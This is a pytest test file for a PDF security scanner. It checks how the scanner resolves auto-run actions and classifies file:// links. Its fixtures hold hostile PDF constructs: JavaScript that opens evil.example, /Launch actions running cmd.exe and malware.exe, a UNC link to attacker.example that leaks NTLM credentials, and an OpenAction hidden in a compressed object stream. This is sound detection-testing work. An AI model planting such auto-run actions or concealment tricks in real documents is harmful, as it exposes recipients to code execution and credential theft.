"""H.2 (0.4.8) — PDF action-target resolution tests.

/OpenAction and /AA findings must report what the action *does* (script
body, URI, launch command) — and a benign "open at page N" OpenAction must
no longer raise HIGH on zero evidence.
"""
from __future__ import annotations

import os
import sys
import tempfile
import zlib

import pytest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../src")))

from doc_firewall.analyzers.pdf.action_resolver import (
    is_benign_action,
    resolve_pdf_actions,
    summarize_actions,
)
from doc_firewall.analyzers.pdf.uri_classify import classify_pdf_uris
from doc_firewall.config import ScanConfig
from doc_firewall.enums import Severity, Verdict, VerdictClass
from doc_firewall.scanner import Scanner


def _pdf(body_objects: bytes, catalog_extra: bytes = b"") -> bytes:
    return (
        b"%PDF-1.4\n"
        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R " + catalog_extra + b" >>\nendobj\n"
        b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n"
        + body_objects
        + b"trailer\n<< /Root 1 0 R >>\n%%EOF\n"
    )


def _objstm(objnum: int, obj_body: bytes, stream_objnum: int = 5) -> bytes:
    """Build an /ObjStm object packing one object (objnum→obj_body)."""
    header = f"{objnum} 0 ".encode()
    first = len(header)
    decompressed = header + obj_body
    comp = zlib.compress(decompressed)
    return (
        f"{stream_objnum} 0 obj\n".encode()
        + b"<< /Type /ObjStm /N 1 /First " + str(first).encode()
        + b" /Length " + str(len(comp)).encode()
        + b" /Filter /FlateDecode >>\nstream\n"
        + comp + b"\nendstream\nendobj\n"
    )


# ─────────────────────────────────────────────────────────────────────────
# Unit: resolve_pdf_actions
# ─────────────────────────────────────────────────────────────────────────

class TestResolver:
    def test_openaction_inline_javascript(self):
        blob = _pdf(b"", b"/OpenAction << /S /JavaScript /JS (app.alert\\(1\\)) >>")
        actions = resolve_pdf_actions(blob)
        assert len(actions) == 1
        a = actions[0]
        assert a["trigger"] == "OpenAction"
        assert a["action_type"] == "javascript"
        assert "app.alert" in a["target"]

    def test_openaction_referenced_javascript(self):
        blob = _pdf(
            b"4 0 obj\n<< /S /JavaScript /JS (this.exportDataObject\\(\\)) >>\nendobj\n",
            b"/OpenAction 4 0 R",
        )
        a = resolve_pdf_actions(blob)[0]
        assert a["action_type"] == "javascript"
        assert "exportDataObject" in a["target"]

    def test_javascript_in_flate_stream(self):
        js = b"var u='http://evil.example/payload'; app.launchURL(u);"
        comp = zlib.compress(js)
        stream_obj = (
            b"5 0 obj\n<< /Length " + str(len(comp)).encode() +
            b" /Filter /FlateDecode >>\nstream\n" + comp + b"\nendstream\nendobj\n"
        )
        blob = _pdf(
            b"4 0 obj\n<< /S /JavaScript /JS 5 0 R >>\nendobj\n" + stream_obj,
            b"/OpenAction 4 0 R",
        )
        a = resolve_pdf_actions(blob)[0]
        assert a["action_type"] == "javascript"
        assert "evil.example" in a["target"]

    def test_openaction_goto_is_benign(self):
        blob = _pdf(
            b"4 0 obj\n<< /S /GoTo /D [3 0 R /Fit] >>\nendobj\n",
            b"/OpenAction 4 0 R",
        )
        a = resolve_pdf_actions(blob)[0]
        assert a["action_type"] == "goto"
        assert is_benign_action(a)

    def test_openaction_destination_array_is_benign(self):
        blob = _pdf(b"", b"/OpenAction [3 0 R /Fit]")
        a = resolve_pdf_actions(blob)[0]
        assert a["action_type"] == "goto"
        assert is_benign_action(a)

    def test_openaction_launch(self):
        blob = _pdf(
            b"4 0 obj\n<< /S /Launch /F (cmd.exe /c calc) >>\nendobj\n",
            b"/OpenAction 4 0 R",
        )
        a = resolve_pdf_actions(blob)[0]
        assert a["action_type"] == "launch"
        assert "cmd.exe" in a["target"]
        assert not is_benign_action(a)

    def test_openaction_uri(self):
        blob = _pdf(
            b"4 0 obj\n<< /S /URI /URI (http://198.51.100.7/x) >>\nendobj\n",
            b"/OpenAction 4 0 R",
        )
        a = resolve_pdf_actions(blob)[0]
        assert a["action_type"] == "uri"
        assert a["target"] == "http://198.51.100.7/x"

    def test_aa_trigger_javascript(self):
        blob = _pdf(
            b"",
            b"/AA << /O << /S /JavaScript /JS (stealCreds\\(\\)) >> >>",
        )
        actions = resolve_pdf_actions(blob)
        assert any(
            a["trigger"] == "AA:/O" and a["action_type"] == "javascript"
            and "stealCreds" in (a["target"] or "")
            for a in actions
        )

    def test_missing_object_unresolvable_with_reason(self):
        blob = _pdf(b"", b"/OpenAction 99 0 R")
        a = resolve_pdf_actions(blob)[0]
        assert a["action_type"] == "unresolvable"
        assert a["reason"]

    def test_next_chain_followed(self):
        blob = _pdf(
            b"4 0 obj\n<< /S /GoTo /D [3 0 R /Fit] "
            b"/Next << /S /JavaScript /JS (chained\\(\\)) >> >>\nendobj\n",
            b"/OpenAction 4 0 R",
        )
        actions = resolve_pdf_actions(blob)
        types = [a["action_type"] for a in actions]
        assert "goto" in types and "javascript" in types

    def test_action_dict_inside_objstm_resolved(self):
        # H.12: action dict hidden in a compressed object stream. Catalog
        # references /OpenAction 4 0 R; obj 4 lives inside the /ObjStm.
        objstm = _objstm(4, b"<< /S /JavaScript /JS (app.launchURL\\('http://evil.example'\\)) >>")
        blob = _pdf(objstm, b"/OpenAction 4 0 R")
        actions = resolve_pdf_actions(blob)
        assert any(
            a["action_type"] == "javascript" and "evil.example" in (a["target"] or "")
            for a in actions
        ), actions

    def test_openaction_in_compressed_catalog_resolved(self):
        # The harder case: the OpenAction *entry* itself is inside the ObjStm
        # (compressed catalog), so /OpenAction never appears in raw bytes.
        cat = b"<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /Launch /F (calc.exe) >> >>"
        objstm = _objstm(6, cat, stream_objnum=5)
        blob = (
            b"%PDF-1.5\n"
            b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
            b"3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n"
            + objstm
            + b"trailer\n<< /Root 6 0 R >>\n%%EOF\n"
        )
        assert b"/OpenAction" not in blob  # proves it's compressed away
        actions = resolve_pdf_actions(blob)
        assert any(
            a["action_type"] == "launch" and "calc.exe" in (a["target"] or "")
            for a in actions
        ), actions

    def test_garbage_never_raises(self):
        assert resolve_pdf_actions(b"\x00\xff" * 5000) == []
        assert resolve_pdf_actions(b"/OpenAction <<" + b"\x00" * 100) is not None
        # Malformed ObjStm headers must not raise.
        assert resolve_pdf_actions(
            b"5 0 obj << /Type /ObjStm /N 9 /First 999 >> stream\nXX\nendstream"
        ) is not None

    def test_summarize_malicious(self):
        actions = [{"trigger": "OpenAction", "action_type": "javascript",
                    "target": "evil()", "reason": None}]
        ev = summarize_actions(actions)
        assert "evil()" in ev["malicious_text"]
        assert not ev["all_benign"]

    def test_summarize_unresolvable_gets_reason(self):
        actions = [{"trigger": "OpenAction", "action_type": "unresolvable",
                    "target": None, "reason": "encrypted"}]
        ev = summarize_actions(actions)
        assert "malicious_text" not in ev
        assert "encrypted" in ev["evidence_unavailable_reason"]


# ─────────────────────────────────────────────────────────────────────────
# End-to-end through the Scanner
# ─────────────────────────────────────────────────────────────────────────

def _scan_bytes(pdf_bytes: bytes):
    with tempfile.NamedTemporaryFile("wb", suffix=".pdf", delete=False) as t:
        t.write(pdf_bytes)
        path = t.name
    try:
        return Scanner(ScanConfig(profile="balanced")).scan(path)
    finally:
        os.unlink(path)


@pytest.mark.benign
class TestBenignOpenAction:
    def test_open_at_page_pdf_not_flagged_for_openaction(self):
        """The classic FP: an exported PDF that opens at page 1."""
        r = _scan_bytes(_pdf(b"", b"/OpenAction [3 0 R /Fit]"))
        oa = [f for f in r.findings if "/OpenAction" in (f.title or "")
              or "/OpenAction" in str((f.evidence or {}).get("token", ""))]
        for f in oa:
            assert f.verdict_class == VerdictClass.INFO, (
                f"benign OpenAction finding still {f.severity}/{f.verdict_class}"
            )
        assert r.verdict == Verdict.ALLOW

    def test_goto_action_object_not_flagged(self):
        r = _scan_bytes(_pdf(
            b"4 0 obj\n<< /S /GoTo /D [3 0 R /Fit] >>\nendobj\n",
            b"/OpenAction 4 0 R",
        ))
        assert r.verdict == Verdict.ALLOW


@pytest.mark.adversarial
class TestMaliciousOpenAction:
    def test_openaction_javascript_flagged_with_script_evidence(self):
        r = _scan_bytes(_pdf(
            b"4 0 obj\n<< /S /JavaScript /JS (app.launchURL\\('http://evil.example'\\)) >>\nendobj\n",
            b"/OpenAction 4 0 R",
        ))
        assert r.verdict in (Verdict.FLAG, Verdict.BLOCK)
        carrying = [
            f for f in r.findings
            if "evil.example" in str((f.evidence or {}).get("malicious_text", ""))
        ]
        assert carrying, (
            "no finding carries the resolved JS body as malicious_text: "
            + str([(f.title, f.evidence) for f in r.findings])
        )

    def test_openaction_launch_flagged_with_command_evidence(self):
        r = _scan_bytes(_pdf(
            b"4 0 obj\n<< /S /Launch /F (cmd.exe /c start malware.exe) >>\nendobj\n",
            b"/OpenAction 4 0 R",
        ))
        assert r.verdict in (Verdict.FLAG, Verdict.BLOCK)
        assert any(
            "cmd.exe" in str((f.evidence or {}).get("malicious_text", ""))
            for f in r.findings
        )

    def test_high_findings_still_high_for_malicious_actions(self):
        r = _scan_bytes(_pdf(
            b"4 0 obj\n<< /S /JavaScript /JS (x\\(\\)) >>\nendobj\n",
            b"/OpenAction 4 0 R",
        ))
        assert any(
            f.severity in (Severity.HIGH, Severity.CRITICAL) for f in r.findings
        )


# ── H.5 (0.4.8): file:// export-artifact tiering ──────────────────────────────


class TestFileUriTiering:
    def test_local_document_path_is_artifact(self):
        blob = b"<< /Type /Annot /A << /S /URI /URI (file:///C:/Users/jdoe/Documents/report.docx) >> >>"
        suspicious, artifacts = classify_pdf_uris(blob)
        assert not suspicious
        assert artifacts and "report.docx" in artifacts[0]["target"]

    def test_local_mac_path_is_artifact(self):
        blob = b"<< /A << /S /URI /URI (file:///Users/jdoe/Desktop/notes.pdf) >> >>"
        suspicious, artifacts = classify_pdf_uris(blob)
        assert not suspicious and artifacts

    def test_remote_host_is_suspicious(self):
        blob = b"<< /A << /S /URI /URI (file://attacker.example/share/x.docx) >> >>"
        suspicious, artifacts = classify_pdf_uris(blob)
        assert suspicious and "NTLM" in suspicious[0]["reason"]
        assert not artifacts

    def test_local_executable_is_suspicious(self):
        blob = b"<< /A << /S /URI /URI (file:///C:/Users/Public/payload.exe) >> >>"
        suspicious, artifacts = classify_pdf_uris(blob)
        assert suspicious and "executable" in suspicious[0]["reason"]

    def test_javascript_scheme_still_suspicious(self):
        blob = b"<< /A << /S /URI /URI (javascript:app.alert(1)) >> >>"
        suspicious, _ = classify_pdf_uris(blob)
        assert suspicious

    def test_https_not_flagged(self):
        blob = b"<< /A << /S /URI /URI (https://www.linkedin.com/in/jdoe) >> >>"
        suspicious, artifacts = classify_pdf_uris(blob)
        assert not suspicious and not artifacts


@pytest.mark.benign
class TestExportArtifactEndToEnd:
    def test_pdf_with_local_file_link_allows(self):
        """Word→PDF export with a leftover internal file:// link must ALLOW."""
        r = _scan_bytes(_pdf(
            b"4 0 obj\n<< /Type /Annot /Subtype /Link "
            b"/A << /S /URI /URI (file:///C:/Users/author/Documents/old.docx) >> >>\nendobj\n",
        ))
        assert r.verdict == Verdict.ALLOW, (
            f"export artifact blocked: {[ (f.title, f.severity) for f in r.findings ]}"
        )
        # The artifact is still visible for audit
        assert any("export artifact" in (f.title or "") for f in r.findings)


@pytest.mark.adversarial
class TestRemoteFileUriEndToEnd:
    def test_pdf_with_unc_file_link_blocks(self):
        r = _scan_bytes(_pdf(
            b"4 0 obj\n<< /Type /Annot /Subtype /Link "
            b"/A << /S /URI /URI (file://attacker.example/share/doc.docx) >> >>\nendobj\n",
        ))
        assert r.verdict == Verdict.BLOCK
        assert any(
            "attacker.example" in str((f.evidence or {}).get("malicious_text", ""))
            for f in r.findings
        )
